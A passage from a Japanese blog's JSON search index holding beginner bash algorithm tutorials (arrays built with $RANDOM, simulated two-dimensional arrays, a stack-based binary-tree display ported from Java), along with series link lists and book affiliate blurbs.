function setArray(){ local N=$1; #すべての要素数 local ID=100; #100からの連番 local value; #配列に代入される要素の値 for((i=0;i\u0026lt;N;i++)){ value=$( echo $RANDOM ); insert $((ID++)) $value; } } ## # \u0026lt;\u0026gt;execArray() # メインルーチン function execArray(){ local N=$1; #要素数 setArray $N #配列にセット display; #表示 } ## # 実行 # time execArray 10; exit; ヒント Bash/シェルスクリプトによる、擬似的な２次元配列の実現が叶いました。つぎからはバブルソートの実装に入りたいと思います。お楽しみに！ 「ざっくり」シリーズのご紹介 【アルゴリズム 再帰】ざっくりわかるシェルスクリプト１５\nhttps://suzukiiichiro.github.io/posts/2022-10-07-01-algorithm-recursion-suzuki/\n【アルゴリズム キュー】ざっくりわかるシェルスクリプト１４\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-queue-suzuki/\n【アルゴリズム スタック】ざっくりわかるシェルスクリプト１３\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-stack-suzuki/\n【アルゴリズム 挿入ソート】ざっくりわかるシェルスクリプト１２\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-insertionsort-suzuki/\n【アルゴリズム 選択ソート】ざっくりわかるシェルスクリプト１１\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-selectionsort-suzuki/\n【アルゴリズム バブルソート】ざっくりわかるシェルスクリプト１０\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-bubblesort-suzuki/\n【アルゴリズム ビッグオー】ざっくりわかるシェルスクリプト９\nhttps://suzukiiichiro.github.io/posts/2022-10-04-01-algorithm-bigo-suzuki/\n【アルゴリズム ２次元配列編】ざっくりわかるシェルスクリプト８\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-eval-array-suzuki/\n【アルゴリズム 配列準備編】ざっくりわかるシェルスクリプト７\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-array-suzuki/\n【アルゴリズム 配列編】ざっくりわかるシェルスクリプト６\nhttps://suzukiiichiro.github.io/posts/2022-09-27-01-array-suzuki/\n【grep/sed/awkも】ざっくりわかるシェルスクリプト５\nhttps://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/\n【grep特集】ざっくりわかるシェルスクリプト４\nhttps://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト３\nhttps://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト２\nhttps://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト１\nhttps://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/\n【TIPS】ざっくりわかるシェルスクリプト\nhttps://suzukiiichiro.github.io/posts/2022-09-26-01-tips-suzuki/\n書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-10-03T15:11:13+09:00","image":"https://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-eval-array-suzuki/algorithm_hu819a85d642270e08bd651dabf1e2fbd4_42552_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-eval-array-suzuki/","title":"【アルゴリズム ２次元配列編】ざっくりわかるシェルスクリプト８"},{"content":"Bashスクリプトで配列の準備 この章では、Bashスクリプトでいくつかのソートアルゴリズムを実行するための、元となるテンプレートを配列で作成します。\n他の言語への移植も視野に入れて、言語に特化したライブラリや構文はあまり使わずに、基本的な構文で記述し、アルゴリズムにフォーカスして表現します。\nですので、「もっと速く」「もっと短くコンパクトなソースで」というよりも、「冗長でもわかりやすく」を理念に書いていきます。\nこの章で使うプログラムソースは以下のディレクトリの01Array.sh を参照してください。\nBashプログラミングによるアルゴリズム 01Array.sh\nファイルの作成 まずは、ファイルを作成します。\n$ :\u0026gt; 01Array.sh シェバンの指定 ファイルを開いてファイルの冒頭一行目にshe-ban（シェバン）を入力します。\nこの行は、$ which bash で得られる bash コマンドのPATHを入力します。\n２行目は空行としておき、３行目からプログラムを書き始めます。\n#!/usr/bin/bash 関数の呼び出し ではさっそく関数名を決めて入力します。\nここでは execArray という関数名とします。\ntimeコマンドは、実行したプログラムの処理時間を計測するコマンドです。\nexitコマンドは、プログラムの終了を意味します。\n「＃」で始まる行はコメント行です。「＃」以降は無視されますので、プログラムの説明などを書くと良いでしょう。\n「１０」という数字は、１０個の配列を作成するという意味となります。\n半角数字で入力してください。\nちまたではどのくらい楽になるのかは不明ですが、行末のセミコロンを省略する人も多いようです。複数行を縮めて表示したいときなどに、適宜、一行にまとめて書く場合のために、行末にはセミコロンを入れます。\nどのプログラミング言語にも言えることですが、プログラムはソースの下から上へ向かって積み上げるように追記していきます。\nここでは、timeコマンドを使って処理速度を計測しつつ、execArray関数を、１０という数字をパラメータで渡して呼び出しています。\n呼び出しているだけで、execArray()関数はまだ書いていませんね笑\n#!/usr/bin/bash ## # time execArray 10; exit; 実行結果は以下のとおりです。\nbashコマンドの後ろに半角スペースを入れて実行ファイル名を入力します。\nbash-5.1$ bash 01Array.sh test: 行 5: execArray: コマンドが見つかりません real\t0m0.002s user\t0m0.001s sys\t0m0.001s bash-5.1$ エラーが表示されていますが、ソースに間違いがあるわけではありません。\n計測数値が表示されていますね。\n項目 意味 real プログラムの呼び出しから終了までにかかった実時間（秒） user プログラム自体の処理時間（秒）（ユーザCPU時間） sys プログラムを処理するために、OSが処理をした時間（秒）（システム時間） execArray関数をまだ書いていませんから、呼び出した関数が見つからないというエラーとなります。\nでは、エラーが出ないように、execArray関数を書いていきましょう。\nexecArray()関数の記述 ## # \u0026lt;\u0026gt;execArray() # function execArray(){ setArray $1; display; } ## # time execArray 10; exit; 関数名はfunctionを関数名の前に記入します。\nこれにより、execArray関数が関数であることが明示的にわかります。\nfunctionを記入することすらも省略可能ではありますが、きちんと記入することで間違いを防ぐことができます。\n関数名の後ろには 「()」が付きます。\n関数は「中括弧｛｝」でくくられます。\n関数の内容は「中括弧｛｝」の中に書きます。\nexecArray()の中身は２つの関数を呼び出しています。\nさきほども説明したとおり、execArrayを呼び出したときにパラメータで渡された「１０」が $1に入っています。\nそして、もうひとつの呼び出し関数は display です。\nこの関数は、配列の中身を表示する関数で、こちらもまだ記述していません。\nsetArray $1; display; setArray関数を呼び出すと同時に、$1という値も渡していることがわかります。\n配列を作成 ソースの末尾にあるexit;の一つ前の行の、setArray $1; は、execArray関数同様に、呼び出し関数です。\n呼び出し関数は関数名のうしろに「（）」や「中括弧｛｝」がありません。\n呼び出し関数\nsetArray $1; 関数の実体（関数そのもの）\nfunction setArray(){ } setArrayやdisplayといって呼び出しはしたものの、２つの関数ともに、関数の実体をまだ書いていません。\nですので、ファイルを実行してもエラーとなります。\n今は気にしないでおきます。\nちなみに、execArray()関数の、setArray $1 ; の「＄１」は、setArray()関数に渡された１番目のパラメータとなります。\nexecArrayを呼び出したときに指定された「１０」という数字が渡されることとなります。\ntime execArray 10; execArray関数に「１０」を渡しているわけです。\nexecArray関数の実体に渡された１つ目のパラメータ「１０」は、execArray関数の中で「$1」として受け取っているわけです。\ndisplay関数も、呼び出してはいるものの、関数の実体をまだ書いていないので、これから書くことにします。\n配列にランダムな数値を代入 では、以下の関数setArray関数をexecArray()関数の上に追記します。\n## # \u0026lt;\u0026gt; set Array # function setArray(){ nElems=0; for((i=0;i\u0026lt;$1;i++));do insert `echo \u0026#34;$RANDOM\u0026#34;`; done } 追記するとソースコードは以下のとおりとなります。\n#!/usr/bin/bash ## # \u0026lt;\u0026gt; set Array # function setArray(){ nElems=0; for((i=0;i\u0026lt;$1;i++));do insert `echo \u0026#34;$RANDOM\u0026#34;`; done } ## # \u0026lt;\u0026gt;execArray() # function execArray(){ setArray $1; display; } ## # time execArray 10; exit; なんとなくソースコードらしくなってきました。\nexecArray()内で呼び出した setArray $1; は、function setArray()を呼び出すと同時に、$1を渡します。\nここの$1は `time execArray 10;で渡した「１０」です。\ntime execArray 10; で、execArray関数に１０を渡す。\n↓\nfunction execArray() で ＄１として１０を受け取る。\n↓\nsetArray $1; で setArray関数に＄１（１０）を渡す。\n↓\nsetArray()で＄１として１０を受け取る。\nsetArray()に渡された「１０」はforループの中の条件 「iが$1よりも小さい間にループを回す」というところで登場していますね。\n要するに渡された＄１を使ってループを１０回すということになります。\nforでループしながらinsertという関数を呼び出しています。\ninsert の後ろに echo \u0026quot;$RANDOM\u0026quot; がパラメータで渡されています。\nこれは、ランダムに数値を生成して insert関数にパラメータとして値を渡しています。\n配列の要素を挿入（作成）する関数の作成 では、以下の関数を setArray()関数の上に追記します。\n## # \u0026lt;\u0026gt; insert # function insert(){ array[((nElems++))]=$1; } insert()関数では、insert関数に渡されたパラメータ「＄１」をarray[]配列に代入しています。\n代入される段階で０で初期化されたnElemsという値がインクリメントされます。\n挿入されるたびに配列arrayの添字がひとつずつ増えていくわけです。\nでは、追記したソースは以下の通りとなります。\n#!/usr/bin/bash ## # \u0026lt;\u0026gt; insert # function insert(){ array[((nElems++))]=$1; } ## # \u0026lt;\u0026gt; set Array # function setArray(){ nElems=0; for((i=0;i\u0026lt;$1;i++));do insert `echo \u0026#34;$RANDOM\u0026#34;`; done } ## # \u0026lt;\u0026gt;execArray() # function execArray(){ setArray $1; display; } ## # time execArray 10; exit; 表示のための関数を作成 最後に、ソースの一番下で、execArray 10; と呼び出している下の display 関数を追記します。\ndisplay関数は、作成した配列の中身を表示する関数です。\n################ ## # \u0026lt;\u0026gt;display # function display(){ for((i=0;i\u0026lt;nElems;i++));do echo \u0026#34;$i\u0026#34; \u0026#34;${array[i]}\u0026#34;; done echo \u0026#34;------\u0026#34;; } insert関数で挿入されるたびにインクリメントされたnElemsの値の数だけループ処理されます。\n１０の配列を準備するわけですから、nElemsの値は、０から始まって最後は９となります。これで１０回分ループします。\n念の為に、ソース全体は以下の通りとなります。\n#!/usr/bin/bash ################ ## # \u0026lt;\u0026gt;display # function display(){ for((i=0;i\u0026lt;nElems;i++));do echo \u0026#34;$i\u0026#34; \u0026#34;${array[i]}\u0026#34;; done echo \u0026#34;------\u0026#34;; } ## # \u0026lt;\u0026gt; insert # function insert(){ array[((nElems++))]=$1; } ## # \u0026lt;\u0026gt; set Array # function setArray(){ nElems=0; for((i=0;i\u0026lt;$1;i++));do insert `echo \u0026#34;$RANDOM\u0026#34;`; done } ## # \u0026lt;\u0026gt;execArray() # function execArray(){ setArray $1; display; } ## # time execArray 10; exit; 作成したプログラムの実行 作成した実行ファイルに間違いがなければ、以下の通り出力されるはずです。\nbash-5.1$ bash 01Array.sh 0 1572 1 21316 2 22127 3 23889 4 6243 5 18211 6 24203 7 30049 8 10593 9 4716 ------ real\t0m0.011s user\t0m0.004s sys\t0m0.006s bash-5.1$ おお、なにやら表示されました。\n１０個の配列にランダムに生成された値がひとつひとつ代入されていますね。\nランダムな数値ですから、実行するたびに、代入された値が変化するのがわかると思います。（ランダムだから）\nこの章では、値を配列に格納できれば完成です。\nbashスクリプトで２次元配列は可能か？ array[0]配列には一つの値を入力できます。\narray[1]にも、array[2]にも一つの値しか入力できません。\nC言語やJavaは２次元配列といって、配列に複数の値を格納することができます。\narray[0]　名前　住所\narray[1]　名前　住所\narray[2]　名前　住所\nといった感じです。\nBashスクリプトは２次元配列をサポートしていないので、\narray[0]　名前\nということしかできません。\nとはいえ、頭の良い人がいるもので、bashスクリプトでも、２次元配列に似た事が実現可能です。\n恐ろしいことに、３次元でも４次元でも可能です。\n具体的にはevalコマンドを使って実現します。\n次の章では、格納した配列の値を比較して、並べ替えたいところですが、ちょっとだけ寄り道をして、\n「この章の内容をevalコマンドを使った２次元配列で実現」\nします。\nこれにより、ソートから続く高度なアルゴリズム、ツリー、グラフの構築がBashスクリプトで可能となります。\nヒント この章で配列が実現できました。次の章ではこの章で作成したソースをevalコマンドを使って２次元配列の実現に挑戦します。 「ざっくり」シリーズのご紹介 【アルゴリズム 再帰】ざっくりわかるシェルスクリプト１５\nhttps://suzukiiichiro.github.io/posts/2022-10-07-01-algorithm-recursion-suzuki/\n【アルゴリズム キュー】ざっくりわかるシェルスクリプト１４\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-queue-suzuki/\n【アルゴリズム スタック】ざっくりわかるシェルスクリプト１３\nhttps://suzukiiichiro.github.io/posts/2022-10-06-01-algorithm-stack-suzuki/\n【アルゴリズム 挿入ソート】ざっくりわかるシェルスクリプト１２\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-insertionsort-suzuki/\n【アルゴリズム 選択ソート】ざっくりわかるシェルスクリプト１１\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-selectionsort-suzuki/\n【アルゴリズム バブルソート】ざっくりわかるシェルスクリプト１０\nhttps://suzukiiichiro.github.io/posts/2022-10-05-01-algorithm-bubblesort-suzuki/\n【アルゴリズム ビッグオー】ざっくりわかるシェルスクリプト９\nhttps://suzukiiichiro.github.io/posts/2022-10-04-01-algorithm-bigo-suzuki/\n【アルゴリズム ２次元配列編】ざっくりわかるシェルスクリプト８\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-eval-array-suzuki/\n【アルゴリズム 配列準備編】ざっくりわかるシェルスクリプト７\nhttps://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-array-suzuki/\n【アルゴリズム 配列編】ざっくりわかるシェルスクリプト６\nhttps://suzukiiichiro.github.io/posts/2022-09-27-01-array-suzuki/\n【grep/sed/awkも】ざっくりわかるシェルスクリプト５\nhttps://suzukiiichiro.github.io/posts/2022-02-02-01-suzuki/\n【grep特集】ざっくりわかるシェルスクリプト４\nhttps://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト３\nhttps://suzukiiichiro.github.io/posts/2022-01-13-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト２\nhttps://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/\n【はじめから】ざっくりわかるシェルスクリプト１\nhttps://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/\n【TIPS】ざっくりわかるシェルスクリプト\nhttps://suzukiiichiro.github.io/posts/2022-09-26-01-tips-suzuki/\n書籍の紹介 詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-10-03T11:36:10+09:00","image":"https://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-array-suzuki/algorithm_hu819a85d642270e08bd651dabf1e2fbd4_42552_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-10-03-01-algorithm-array-suzuki/","title":"【アルゴリズム 配列準備編】ざっくりわかるシェルスクリプト７"},{"content":"9月29日 今日はバイナリサーチでツリーの中身を表示するメソッドを作成します。\nこんな感じでルートノードから下に向かってツリーの中身を出力します。\n...................................................... 50 25 75 12 37 -- 87 -- -- 30 43 -- -- -- 93 -- -- -- -- -- 33 -- -- -- -- -- -- -- -- -- 97 ...................................................... javaのプログラムは以下の通り\nStackを利用しています。\nbashにはStackがないのでメソッドを自作する必要がありそう\nStackも配列の操作なのでbashの配列操作を使ってメソッドを作成します。\n配列操作の基本については鈴木維一郎先生が作成したページを参考にしてください。\nhttps://suzukiiichiro.github.io/posts/2022-09-27-01-array-suzuki/\npublic void displayTree() { Stack globalStack = new Stack(); globalStack.push(root); int nBlanks = 32; boolean isRowEmpty = false; System.out.println( \u0026#34;......................................................\u0026#34;); while(isRowEmpty==false) { Stack localStack = new Stack(); isRowEmpty = true; for(int j=0; j\u0026lt;nBlanks; j++) System.out.print(\u0026#39; \u0026#39;); while(globalStack.isEmpty()==false) { Node temp = (Node)globalStack.pop(); if(temp != null) { System.out.print(temp.iData); localStack.push(temp.leftChild); localStack.push(temp.rightChild); if(temp.leftChild != null || temp.rightChild != null) isRowEmpty = false; } else { System.out.print(\u0026#34;--\u0026#34;); localStack.push(null); localStack.push(null); } for(int j=0; j\u0026lt;nBlanks*2-2; j++) System.out.print(\u0026#39; \u0026#39;); } // end while globalStack not empty System.out.println(); nBlanks /= 2; while(localStack.isEmpty()==false) globalStack.push( localStack.pop() ); } // end while isRowEmpty is false System.out.println( \u0026#34;......................................................\u0026#34;); } // end displayTree() // ------------------------------------------------------------- } // end class Tree スタックは後入れ先出しです。\npushで配列の後ろに要素を追加し、popで配列の一番後ろに入れた要素を取り出します。\nisEmptyという配列が空になったかを判定するメソッドも必要です。\npopで最後の配列要素をechoし、unsetで最後の配列要素を削除しようとしたのですが、\ncurrent=$(localStack.pop)という形で呼び出すと、サブシェルで呼び出すのでechoで最後の要素の内容は受け取れるのですが、unsetの結果が反映されませんでした。\nしょうがないので最後の配列要素をechoするpeekメソッドを作り、popは、unsetだけする動作に変更しました。\nfunction Stack_global.push() { Stack_global+=($1) } function Stack_global.pop() { if [ ${#Stack_global[*]} == 0 ];then echo \u0026#34;null\u0026#34;; return; fi local el=${Stack_global[${#Stack_global[*]}-1]} po=$((${#Stack_global[*]}-1)) unset Stack_global[$po] } function Stack_global.peek() { if [ ${#Stack_global[*]} == 0 ];then echo \u0026#34;null\u0026#34;; return; fi local el=${Stack_global[${#Stack_global[*]}-1]} po=$((${#Stack_global[*]}-1)) echo $el } function Stack_global.isEmpty() { if [ ${#Stack_global[*]} == 0 ];then echo \u0026#34;true\u0026#34;; else echo \u0026#34;false\u0026#34; fi } bashのプログラムは以下の形になります。\npublic void displayTree() { Stack globalStack = new Stack(); globalStack.push(root); int nBlanks = 32; boolean isRowEmpty = false; System.out.println( \u0026#34;......................................................\u0026#34;); while(isRowEmpty==false) { Stack localStack = new Stack(); isRowEmpty = true; for(int j=0; j\u0026lt;nBlanks; j++) System.out.print(\u0026#39; \u0026#39;); while(globalStack.isEmpty()==false) { Node temp = (Node)globalStack.pop(); if(temp != null) { System.out.print(temp.iData); localStack.push(temp.leftChild); localStack.push(temp.rightChild); if(temp.leftChild != null || temp.rightChild != null) isRowEmpty = false; } else { System.out.print(\u0026#34;--\u0026#34;); localStack.push(null); localStack.push(null); } for(int j=0; j\u0026lt;nBlanks*2-2; j++) System.out.print(\u0026#39; \u0026#39;); } // end while globalStack not empty System.out.println(); nBlanks /= 2; while(localStack.isEmpty()==false) globalStack.push( localStack.pop() ); } // end while isRowEmpty is false System.out.println( \u0026#34;......................................................\u0026#34;); } // end displayTree() // ------------------------------------------------------------- } // end class Tree Stackをglobal,localの２つを使っています。 push,pop,isEmpty,peekのメソッドをそれぞれ個別に作成しましたが、evalで１つにまとめた方が良いかもしれません。\n書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-09-29T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-09-29-01-ani/path_hu71550af48fd719c5bc16d756459bb446_156863_200x0_resize_box_3.png","permalink":"https://suzukiiichiro.github.io/posts/2022-09-29-01-ani/","title":"アルゴリズム日記 2022/09/29"},{"content":"Bashスクリプト（シェルスクリプト） は５０年以上も前からUNIXプログラミングのエッセンスとして君臨し、現在もLinuxのコマンドの殆どを構築しています。\nこうしたShellと言われるものはいくつか存在します。\nBourne Shell\nBourne Again Shell\nC Shell\nKorn Shell\nTC Shell\nBourne Again Shell ( BASH ) は、多くのLinuxディストリビューションのデフォルトシェルです。\n強力なコマンド編集機能\n無制限のイベント履歴\nエイリアスの導入\n無制限のサイズの配列\nBashは、強力な編集機能や変更機能など、多くの高度な機能があり、信じられないほどユーザー 